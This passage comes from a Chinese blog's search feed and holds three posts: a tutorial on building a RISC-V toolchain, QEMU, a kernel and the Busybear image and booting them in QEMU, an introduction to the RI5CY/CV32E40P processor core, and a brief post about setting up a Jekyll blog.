class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install autoconf automake autotools-dev curl libmpc-dev libmpfr-dev libgmp-dev \<br>                 gawk build-essential bison flex texinfo gperf libtool patchutils bc zlib1g-dev libexpat-dev git<br></code></pre></td></tr></table></figure><h2 id="构建">构建</h2><h3 id="riscv-gnu-toolchain">riscv-gnu-toolchain</h3><p>首先，我们的主机环境需要有 RISC-V 的全套工具链，用于编译、链接、调试基于 RISC-V 架构的程序语言。一般来说，常见的主机环境都是 AMD-64 架构，Linux 操作系统自带的 gcc gdb等是无法编译 RISC-V 程序的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd riscv-gnu-toolchain<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">pick an install path, e.g. /opt/riscv64</span><br>./configure --prefix=/opt/riscv64 <br>make newlib -j $(nproc)<br>make linux -j $(nproc)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">export</span> variables</span><br>export PATH=&quot;$PATH:/opt/riscv64/bin&quot;<br>export RISCV=&quot;/opt/riscv64&quot;<br></code></pre></td></tr></table></figure><p>由于网络问题，RISC-V 工具链难以全部下载完成，大家需要通过各种渠道获取<code>: )</code>。</p><h3 id="QEMU">QEMU</h3><p>然后，就是对大名鼎鼎的虚拟机 QEMU 进行构建了， 针对非常多不同的架构，QEMU 有相应的虚拟机，所以 configure 的时候需要自己指定，<code>--target-list</code> 就是在指定架构。riscv64-linux-user 为用户模式，可以运行基于RISC-V 指令集编译的程序文件，softmmu 为镜像模拟器，可以运行基于 RISC-V 指令集编译的 Linux 镜像。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd qemu<br>git checkout v3.0.0<br>./configure --target-list=riscv64-softmmu, riscv64-linux-user<br>make -j $(nproc)<br>sudo make install<br></code></pre></td></tr></table></figure><p>接下来构建 Linux 。将下载下来的 Linux 内核（我这边使用的是 Linux-5.7.9）进行编译构建。但是要注意到，因为在 QEMU 上跑该内核时，我们计划用 busybear 文件系统镜像，因此 config 最好与 busybear 一致。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd linux-5.7.9<br>cp ../busybear-linux/conf/linux.config .config   # 直接拷贝 busybear 的 linux config<br>make ARCH=riscv CROSS_COMPILE=riscv64-unknown-linux-gnu- olddefconfig<br><span class="hljs-meta prompt_"># </span><span class="language-bash">make ARCH=riscv CROSS_COMPILE=riscv64-unknown-linux-gnu- nconfig  <span class="hljs-comment"># 配置内核 直接退出即可</span></span><br>make ARCH=riscv CROSS_COMPILE=riscv64-unknown-linux-gnu- vmlinux -j $(nproc)<br></code></pre></td></tr></table></figure><p>上面最后一句话是在构建 vmlinux ，这里需要等待一些时间。</p><blockquote><p>vmlinux is a <strong>statically linked executable</strong> file format based file which is the uncompressed version of kernel image which can be used for debugging.</p></blockquote><h3 id="BBL">BBL</h3><p>BBL 是何物？全称为 Berkeley Boot Loader 。作为一个 boot 启动，装载内核。</p><blockquote><p>This package also contains the Berkeley Boot Loader, <code>bbl</code>, which is a supervisor execution environment for tethered RISC-V systems. It is designed to host the RISC-V Linux port.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd riscv-pk<br>mkdir build &amp;&amp; cd build<br>../configure --enable-logo --host=riscv64-unknown-elf --with-payload=../../linux/vmlinux<br>make -j $(nproc)<br></code></pre></td></tr></table></figure><h3 id="Busybear-Linux">Busybear Linux</h3><p>Busybear 又是什么东西？简而言之，是一个 RISC-V Linux 的文件系统镜像，而且是针对 virt 虚拟机使用的。</p><blockquote><p>busybear-linux is a tiny RISC-V Linux root filesystem image that targets the <code>virt</code> machine in riscv-qemu. As the name suggests, busybear-linux is a riscv-linux root image comprised of busybox and dropbear.</p><p>The root image is intended to demonstrate <strong>virtio-net and virtio-block in riscv-qemu</strong> and features a dropbear ssh server which allows out-of-the-box ssh access to a RISC-V virtual machine.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd busybear-linux<br>make -j $(nproc)<br></code></pre></td></tr></table></figure><p>在构建期间，可能会遇到如下问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/opt/riscv/sysroot/usr/include/gnu/stubs.h:14:11: fatal  error: gnu/stubs-lp64.h:  No such file or directory ...<br></code></pre></td></tr></table></figure><p>解决该问题，只需要打开 conf/busybear.config ，把 CROSS_COMPILE = riscv64-unknown-linux-gnu- 修改为CROSS_COMPILE = riscv64-unknown-elf-。</p><h2 id="运行">运行</h2><p>接下来就是激动人心的运行时间了！到你的主目录下，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo qemu-system-riscv64 -nographic -machine virt \<br>     -kernel riscv-pk/build/bbl -append &quot;root=/dev/vda ro console=ttyS0&quot; \<br>     -drive file=busybear-linux/busybear.bin,format=raw,id=hd0 \<br>     -device virtio-blk-device,drive=hd0<br></code></pre></td></tr></table></figure><p>QEMU 会让你输入用户名和密码，如果你仔细看的话，busybear.config 里面有一个叫 ROOT_PASSWORD 的项。所以你的用户名密码就是：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> root<br><span class="hljs-symbol">password:</span> busybear<br></code></pre></td></tr></table></figure><p>然后，让我来一一解释一下这么长的命令行在干什么。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo qemu-system-riscv64 -nographic -machine virt<br></code></pre></td></tr></table></figure><p>这句话就是启动 QEMU 虚拟机，设置为不显示图形界面模式 <code>-nographic</code>，并指定机器为 <code>-machine virt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-kernel riscv-pk/build/bbl -append &quot;root=/dev/vda ro console=ttyS0&quot; <br></code></pre></td></tr></table></figure><p>QEMU 指定 kernel 镜像为 bbl ， <code>-append</code> 指定了 kernel 命令行，指示 Linux Kernel 从这里启动。</p><blockquote><p>Use <code>-kernel</code> to provide the Linux kernel image and <code>-append</code> to give the kernel command line arguments. The <code>-initrd</code> option can be used to provide an INITRD image.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-drive file=busybear-linux/busybear.bin,format=raw,id=hd0 \<br></code></pre></td></tr></table></figure><p>这里指定了文件系统镜像的路径、格式、以及它的 id 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-device virtio-blk-device,drive=hd0<br></code></pre></td></tr></table></figure><p>注意到 busybear 的说明，其目的是验证<code>virtio-blk-device</code>。</p><p>出现下图所示的情况，构建就算成功了！</p><p><img src="https://risc-v-getting-started-guide.readthedocs.io/en/latest/_images/linux64-qemu.gif" alt=""></p><h2 id="参考">参考</h2><ul><li><a href="https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html#running-64-and-32-bit-risc-v-linux-on-qemu">Running 64- and 32-bit RISC-V Linux on QEMU</a></li><li><a href="https://www.cnblogs.com/javaIOException/p/7525828.html">qemu模拟器下编译运行基于riscv指令集的Linux操作系统</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RI5CY 介绍</title>
    <link href="/2020/07/16/2020-7-16-RI5CY/"/>
    <url>/2020/07/16/2020-7-16-RI5CY/</url>
    
    <content type="html"><![CDATA[<h1>Introduction of RI5CY(CV32E40P)</h1><h2 id="什么是-RI5CY">什么是 RI5CY</h2><ul><li>4阶段流水线，顺序的 32-bit 的 RISC-V 处理核，后改名为 CV32E40P，但为方便叙述，以下均称之为 RI5CY。</li><li>RI5CY 支持的最基础的 RISC-V 指令集版本（最新）的是 <a href="https://github.com/riscv/riscv-isa-manual/releases/tag/archive">RV32I Base Integer Instruction Set version 2.1</a>。除此之外，它还支持以下 RISC-V 指令集：<ul><li>C : Standard Extension for Compressed Instructions 2.0</li><li>M : Standard Extension for Integer Multiplication and Division 2.0</li><li>Zicsr : Control and Status Register Instructions 2.0</li><li>Zifencei : Instruction-Fetch Fence 2.0</li><li>F : Single-Precision Floating-Point 2.2</li></ul></li><li>它的 ISA 不仅支持最基本的 RISC-V 指令集，还增添了如下指令：<ul><li>乘加指令 (multiple additional instructions)</li><li>硬件循环 (hardware loops)</li><li>后累加装载指令 (post-increment load-store instructions)</li><li>额外的 ALU 运算指令</li></ul></li><li>由 OpenHW Group 开发，这里是它的<a href="https://core-v-docs-verif-strat.readthedocs.io/projects/cv32e40p_um/en/latest/">用户手册</a>，会有更多详细的介绍，以及它的<a href="https://github.com/openhwgroup/cv32e40p">源代码</a>。</li></ul><h2 id="OpenHW-Group-是什么来头">OpenHW Group 是什么来头</h2><p><a href="https://www.openhwgroup.org/">OpenHw</a> 是一个非盈利的国际组织。该组织的软硬件开发人员在开源核 (open-source core)，相关IP (related IP)，工具和软件等开发方面进行协作。OpenHW 提供了一个基础架构，用于托管符合行业最佳实践的高质量开源硬件开发。</p><p>OpenHW 组织属于 CORE-V Family。CORE-V 是一系列基于RISC-V，以及为电子系统设计师提供相关的处理器子系统 IP，工具和软件的开源核项目。CORE-V Family 在硅片和 FPGA 优化实现中提供符合行业的高质量核心 IP。</p><p>OpenHW 组织的<a href="https://www.openhwgroup.org/working-groups/">主要技术负责人</a>都在国内外非常有名的研究机构或企业任职。该组织的<a href="https://www.openhwgroup.org/about-us/">董事会</a>主席 Rob同时还是 RISC-V International 董事会成员。 Rob也是IEEE的高级成员，兼任 Southern Methodist University 和 the University of Texas 的兼职教授。</p><h2 id="从-RI5CY-到-CV32E40P">从 RI5CY 到 CV32E40P</h2><p>从官方<a href="https://core-v-docs-verif-strat.readthedocs.io/projects/cv32e40p_um/en/latest/intro.html">用户手册</a>上可以了解到，CV32E40P 最初是基于 OpenRISC ISA 的 OR10N CPU 核的分支。在去年我开始了解该处理核的这个时候，其正式名字还是 RI5CY，到了今年就更名为 CV32E40P，项目更名一定程度上伴随着组织关系的变化。之前 RI5CY 的项目主要是由 <a href="https://pulp-platform.org/">PULP Platform</a> 负责。</p><p>PULP Platform 的全称为 Parallel Ultra Low Power Platform。该组织的主要工作是开发开源的、可扩展的软硬件研究开发平台，以突破毫瓦功率级别的能效墙，并满足需要灵活处理数据流的 loT 应用的计算需求，例如加速度计，低分辨率摄像头，麦克风阵列和生命体征监视器。</p><p>在 OpenHW Group 成立之初，PULP加入了这个组织，并将一些有关 RISC-V 核的实现工程转移到了 OpenHW Group 组织之下，其中 RI5CY 便是其中之一。</p><h2 id="RI5CY-的特点">RI5CY 的特点</h2><p>之前提到，RI5CY 是一个顺序的4阶段流水线 32-bit 的 RISC-V 处理核。它的流水线设计图如下：</p><p><img src="/img/RISC-V_core.png" alt="Block Diagram of CV32E40P(RI5CY) core"></p><p>RI5CY 是一个非常好的自定义处理核的起点，这也是它在科研圈较受欢迎的原因之一。当然这相当程度上归功于 1）开发组人员对它的良好维护，2）非常清晰明确的源代码，3）能被综合或仿真工具实例化，4）有 <a href="https://www.veripool.org/wiki/verilator">Verilator</a> 模型的测试平台，5）可在 FPGA 和 ASIC 上高效实例化。</p><p>在最初开发 RI5CY 的过程中 <a href="https://pulp-platform.org/">PULP Platform</a> 就制定了一个设计目标，追求高能效的信号处理。为此，它们添加了乘加指令 (multiple additional instructions)、硬件循环 (hardware loops)、后累加装载指令 (post-increment load-store instructions)和额外的 ALU 运算指令(min, max, absolute value)。这样一来，可以减少要处理的指令，减少能耗。</p><p>除了在 ISA 上做增添外，设计人员加入了<a href="https://core-v-docs-verif-strat.readthedocs.io/projects/cv32e40p_um/en/latest/exceptions_interrupts.html">中断 (Interrupts)、异常 (Exceptions)</a>、<a href="https://core-v-docs-verif-strat.readthedocs.io/projects/cv32e40p_um/en/latest/sleep.html">事件 (Events)</a>、<a href="https://core-v-docs-verif-strat.readthedocs.io/projects/cv32e40p_um/en/latest/debug.html">调试 (Debug)</a>、<a href="https://core-v-docs-verif-strat.readthedocs.io/projects/cv32e40p_um/en/latest/perf_counters.html">性能 (Performance Counters)</a> 等多个功能。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
      <category>Verilog</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
      <tag>Verilog</tag>
      
      <tag>RI5CY</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的第一篇 blog</title>
    <link href="/2020/07/02/2020-7-2-first-blog/"/>
    <url>/2020/07/02/2020-7-2-first-blog/</url>
    
    <content type="html"><![CDATA[<p>在本地配置 <a href="https://jekyllrb.com/">jekyll</a> 和 <a href="https://rubygems.org/">Ruby</a> 的环境并不是一件轻松的事情。感谢 <a href="https://ibug.io/blog/2018/04/build-github-pages-with-travis-ci/">iBug</a> 的博客给了我很多帮助。如果你们有需要，或者仅仅是好奇如何搭建这样的主页网站，可以去上面的链接看看。</p><p>最后一步居然卡在了 <a href="https://www.rubydoc.info/gems/jekyll-theme-slate/0.0.4/">jekyll-theme-slate</a> 的主题配置上，有点不太应该，但凡遇到些不懂的，还是要马上 google 啊。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
